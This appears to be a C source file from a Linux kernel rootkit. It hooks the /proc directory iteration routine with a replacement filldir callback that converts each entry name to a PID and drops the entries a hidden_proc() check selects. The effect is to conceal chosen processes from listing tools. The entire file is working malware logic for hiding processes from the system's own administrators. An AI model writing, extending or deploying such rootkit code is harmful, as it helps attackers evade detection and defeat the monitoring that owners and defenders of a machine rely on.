#include <linux/types.h>
#include <linux/kernel.h>

/* include */
#include "debug.h"
#include "filldir_proto.h"

/* hook */
#include "sym_map.h"

/* logic */
#include "hidden.h"

/* hooked */
#include "proc_iterate.h"

/**
 *
 *
 */
static int (*filldir)(FILLDIR_PROTO);

/**
 *
 *
 */
static int _m_proc_filldir(FILLDIR_PROTO)
{
        char *endp;
        unsigned long pid;

        pid = simple_strtol(name, &endp, 10);
        if (hidden_proc(pid, name))
                return 0;

        return filldir(FILLDIR_ARGS);
}

int m_proc_iterate(ITERATE_PROTO)
{
        int ret;

        DEBUG("shini :: m_proc_iterate, called!\n");
        filldir = FILLDIR_VAR;
        REPLACE_FILLDIR(sym_map.old->proc_iterate, _m_proc_filldir);

        return ret;
}

